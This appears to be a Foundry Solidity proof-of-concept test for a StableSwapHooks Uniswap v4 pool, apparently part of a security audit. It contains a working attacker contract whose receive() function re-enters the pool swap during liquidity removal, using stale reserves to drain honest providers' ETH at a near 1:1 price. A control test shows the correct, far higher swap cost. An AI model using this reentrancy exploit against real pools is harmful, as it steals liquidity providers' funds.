// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.30;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

import {BalanceDelta, BalanceDeltaLibrary} from "@uniswap/v4-core/src/types/BalanceDelta.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {IHooks} from "@uniswap/v4-core/src/interfaces/IHooks.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {IUnlockCallback} from "@uniswap/v4-core/src/interfaces/callback/IUnlockCallback.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {SwapParams} from "@uniswap/v4-core/src/types/PoolOperation.sol";
import {TickMath} from "@uniswap/v4-core/src/libraries/TickMath.sol";

import {Base} from "src/Base.sol";
import {StableSwapHooks} from "src/StableSwapHooks.sol";
import {StableSwapHooksFactoryHarness} from "test/testUtils/StableSwapHooksFactoryHarness.sol";
import {ExternalContractsDeployer} from "test/testUtils/ExternalContractsDeployer.sol";
import {MockERC20} from "test/scenarios/mocks/MockERC20.sol";

contract RemoveLiquidityReentrancyPoC is ExternalContractsDeployer {
    using SafeERC20 for IERC20;

    uint256 internal constant LP_FEE_PERCENTAGE = 300;
    uint256 internal constant AMP = 100;
    uint256 internal constant HONEST_LIQUIDITY = 10_000 ether;
    uint256 internal constant ATTACKER_LIQUIDITY = 990_000 ether;
    uint256 internal constant REENTRANT_ETH_OUT = 9_999 ether;

    StableSwapHooksFactoryHarness internal factory;
    StableSwapHooks internal hooks;
    MockERC20 internal token;
    Currency internal nativeEth;
    Currency internal tokenCurrency;
    address internal admin;
    address internal honestLp;

    function setUp() public override {
        super.setUp();

        nativeEth = Currency.wrap(address(0));
        token = new MockERC20("Mock Token", "MOCK", 18);
        tokenCurrency = Currency.wrap(address(token));
        admin = makeAddr("admin");
        honestLp = makeAddr("honestLp");

        factory = new StableSwapHooksFactoryHarness(
            IPoolManager(poolManager),
            admin,
            makeAddr("protocolFeeCollector"),
            makeAddr("hookFeeCollector"),
            keccak256(type(StableSwapHooks).creationCode)
        );

        hooks = _deployHooks();

        vm.deal(honestLp, HONEST_LIQUIDITY);
        token.mint(honestLp, HONEST_LIQUIDITY);
        vm.prank(honestLp);
        token.approve(address(hooks), type(uint256).max);

        uint256[] memory amounts = _makeAmounts(HONEST_LIQUIDITY, HONEST_LIQUIDITY);
        vm.prank(honestLp);
        hooks.addLiquidity{value: HONEST_LIQUIDITY}(amounts, new uint256[](2), 0);
    }

    function test_removeLiquidityReentersSwapBeforeReservesAndSharesAreUpdated() public {
        RemoveLiquidityReenterAttacker attacker =
            new RemoveLiquidityReenterAttacker(hooks, IPoolManager(poolManager), token, _poolKey());

        vm.deal(address(attacker), ATTACKER_LIQUIDITY);
        token.mint(address(attacker), ATTACKER_LIQUIDITY + 25_000 ether);

        attacker.addLiquidity{value: ATTACKER_LIQUIDITY}(ATTACKER_LIQUIDITY, ATTACKER_LIQUIDITY);
        assertEq(hooks.reserves(0), HONEST_LIQUIDITY + ATTACKER_LIQUIDITY, "pre-attack ETH reserve");
        assertEq(hooks.reserves(1), HONEST_LIQUIDITY + ATTACKER_LIQUIDITY, "pre-attack token reserve");

        attacker.attack(REENTRANT_ETH_OUT);

        console2.log("reentrant observed ETH reserve before swap", attacker.observedEthReserveBeforeSwap());
        console2.log("reentrant ETH taken", attacker.ethTakenInReentrantSwap());
        console2.log("reentrant token paid", attacker.tokenPaidInReentrantSwap());
        console2.log("final ETH reserve", hooks.reserves(0));
        console2.log("final token reserve", hooks.reserves(1));

        assertTrue(attacker.reentered(), "receive() reentered PoolManager.swap");
        assertEq(attacker.observedEthReserveBeforeSwap(), HONEST_LIQUIDITY + ATTACKER_LIQUIDITY);
        assertEq(attacker.ethTakenInReentrantSwap(), REENTRANT_ETH_OUT);

        assertLt(attacker.tokenPaidInReentrantSwap(), 10_100 ether, "stale reserve swap paid near 1:1");
        assertLt(hooks.reserves(0), 2 ether, "nearly all honest ETH reserve drained");
        assertGt(hooks.reserves(1), 19_800 ether, "pool left with token-heavy reserve imbalance");
    }

    function test_controlSameSwapAfterNormalRemovalCostsMuchMore() public {
        RemoveLiquidityReenterAttacker lp =
            new RemoveLiquidityReenterAttacker(hooks, IPoolManager(poolManager), token, _poolKey());

        vm.deal(address(lp), ATTACKER_LIQUIDITY);
        token.mint(address(lp), ATTACKER_LIQUIDITY);

        lp.addLiquidity{value: ATTACKER_LIQUIDITY}(ATTACKER_LIQUIDITY, ATTACKER_LIQUIDITY);
        lp.removeAllLiquidityWithoutReentry();

        assertEq(hooks.reserves(0), HONEST_LIQUIDITY, "post-removal ETH reserve");
        assertEq(hooks.reserves(1), HONEST_LIQUIDITY, "post-removal token reserve");

        DirectExactOutSwapper controlSwapper =
            new DirectExactOutSwapper(IPoolManager(poolManager), token, _poolKey());
        token.mint(address(controlSwapper), 200_000 ether);

        controlSwapper.swapTokenForExactEth(REENTRANT_ETH_OUT);

        console2.log("control ETH taken", controlSwapper.ethTaken());
        console2.log("control token paid", controlSwapper.tokenPaid());

        assertEq(controlSwapper.ethTaken(), REENTRANT_ETH_OUT);
        assertGt(controlSwapper.tokenPaid(), 100_000 ether, "real post-removal reserve price is much worse");
    }

    function _deployHooks() internal returns (StableSwapHooks deployedHooks) {
        Currency[] memory currencies = new Currency[](2);
        currencies[0] = nativeEth;
        currencies[1] = tokenCurrency;

        Base.RateOracleConfig[] memory rateOracles = new Base.RateOracleConfig[](2);
        rateOracles[0] = Base.RateOracleConfig({oracle: address(0), selector: bytes4(0)});
        rateOracles[1] = Base.RateOracleConfig({oracle: address(0), selector: bytes4(0)});

        bytes memory code = type(StableSwapHooks).creationCode;
        (, bytes32 salt) = factory.mineSalt(currencies, rateOracles, LP_FEE_PERCENTAGE, AMP, code);

        deployedHooks =
            StableSwapHooks(factory.deploy(currencies, rateOracles, LP_FEE_PERCENTAGE, AMP, salt, code));
    }

    function _poolKey() internal view returns (PoolKey memory) {
        return PoolKey({
            currency0: nativeEth,
            currency1: tokenCurrency,
            fee: uint24(LP_FEE_PERCENTAGE),
            tickSpacing: hooks.TICK_SPACING(),
            hooks: IHooks(address(hooks))
        });
    }

    function _makeAmounts(uint256 ethAmount, uint256 tokenAmount) internal pure returns (uint256[] memory amounts) {
        amounts = new uint256[](2);
        amounts[0] = ethAmount;
        amounts[1] = tokenAmount;
    }
}

contract RemoveLiquidityReenterAttacker {
    using BalanceDeltaLibrary for BalanceDelta;
    using SafeERC20 for IERC20;

    StableSwapHooks internal immutable hooks;
    IPoolManager internal immutable poolManager;
    MockERC20 internal immutable token;
    PoolKey internal poolKey;

    bool public attackActive;
    bool public reentered;
    uint256 public targetEthOut;
    uint256 public observedEthReserveBeforeSwap;
    uint256 public tokenPaidInReentrantSwap;
    uint256 public ethTakenInReentrantSwap;

    constructor(StableSwapHooks _hooks, IPoolManager _poolManager, MockERC20 _token, PoolKey memory _poolKey) {
        hooks = _hooks;
        poolManager = _poolManager;
        token = _token;
        poolKey = _poolKey;
        _token.approve(address(_hooks), type(uint256).max);
    }

    function addLiquidity(uint256 ethAmount, uint256 tokenAmount) external payable {
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = ethAmount;
        amounts[1] = tokenAmount;

        hooks.addLiquidity{value: msg.value}(amounts, new uint256[](2), 0);
    }

    function attack(uint256 ethOut) external {
        targetEthOut = ethOut;
        attackActive = true;

        hooks.removeLiquidity(hooks.balanceOf(address(this)), new uint256[](2));

        attackActive = false;
    }

    function removeAllLiquidityWithoutReentry() external {
        hooks.removeLiquidity(hooks.balanceOf(address(this)), new uint256[](2));
    }

    receive() external payable {
        if (!attackActive || reentered) {
            return;
        }

        reentered = true;
        observedEthReserveBeforeSwap = hooks.reserves(0);

        BalanceDelta delta = poolManager.swap(
            poolKey,
            SwapParams({
                zeroForOne: false,
                amountSpecified: int256(targetEthOut),
                sqrtPriceLimitX96: TickMath.MAX_SQRT_PRICE - 1
            }),
            ""
        );

        uint256 ethOut = uint128(delta.amount0());
        uint256 tokenIn = uint128(-delta.amount1());

        tokenPaidInReentrantSwap = tokenIn;
        ethTakenInReentrantSwap = ethOut;

        poolManager.sync(poolKey.currency1);
        IERC20(address(token)).safeTransfer(address(poolManager), tokenIn);
        poolManager.settle();
        poolManager.take(poolKey.currency0, address(this), ethOut);
    }
}

contract DirectExactOutSwapper is IUnlockCallback {
    using BalanceDeltaLibrary for BalanceDelta;
    using SafeERC20 for IERC20;

    IPoolManager internal immutable poolManager;
    MockERC20 internal immutable token;
    PoolKey internal poolKey;

    uint256 public tokenPaid;
    uint256 public ethTaken;

    constructor(IPoolManager _poolManager, MockERC20 _token, PoolKey memory _poolKey) {
        poolManager = _poolManager;
        token = _token;
        poolKey = _poolKey;
    }

    function swapTokenForExactEth(uint256 ethOut) external {
        poolManager.unlock(abi.encode(ethOut));
    }

    function unlockCallback(bytes calldata data) external returns (bytes memory) {
        require(msg.sender == address(poolManager), "only poolManager");

        uint256 targetEthOut = abi.decode(data, (uint256));
        BalanceDelta delta = poolManager.swap(
            poolKey,
            SwapParams({
                zeroForOne: false,
                amountSpecified: int256(targetEthOut),
                sqrtPriceLimitX96: TickMath.MAX_SQRT_PRICE - 1
            }),
            ""
        );

        uint256 ethOut = uint128(delta.amount0());
        uint256 tokenIn = uint128(-delta.amount1());

        tokenPaid = tokenIn;
        ethTaken = ethOut;

        poolManager.sync(poolKey.currency1);
        IERC20(address(token)).safeTransfer(address(poolManager), tokenIn);
        poolManager.settle();
        poolManager.take(poolKey.currency0, address(this), ethOut);

        return "";
    }

    receive() external payable {}
}
